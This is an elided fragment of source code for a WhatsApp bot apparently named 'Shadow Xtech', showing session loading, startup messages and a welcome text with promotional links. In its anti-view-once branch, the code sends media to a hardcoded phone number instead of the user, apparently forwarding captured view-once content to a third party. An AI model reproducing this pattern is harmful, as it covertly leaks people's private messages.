...
const sessdata = config.SESSION_ID.replace("CLOUD-AI~", '');
...
console.log("Session downloaded ✅")
  ...
  console.log("Connecting Sʜᴀᴅᴏᴡ Xᴛᴇᴄʜ to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing Sʜᴀᴅᴏᴡ Xᴛᴇᴄʜ Plugins')
  const path = require('path');
  ...
  let up = `*Hello there 👋🏻 ❖ Sʜᴀᴅᴏᴡ ❖ Xᴛᴇᴄʜ ❖ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by Ⴊl𐌀Ꮳk𐌕𐌀ႲႲჄ TECH INC. \ud83c\udf8a, Meet ❖ Sʜᴀᴅᴏᴡ Xᴛᴇᴄʜ ❖ WhatsApp Bot.\n\n *Thanks for using ❖ Sʜᴀᴅᴏᴡ ❖ Xᴛᴇᴄʜ ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 🩷\n \nhttps://whatsapp.com/channel/0029VasHgfG4tRrwjAUyTs10\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⭐\n\nhttps://github.com/Tappy-Black/SHADOW-XTECH\n\n> © Powered by Ⴊl𐌀Ꮳk𐌕𐌀ႲႲჄ😇 \ud83d\udda4`;
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("254756360360@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
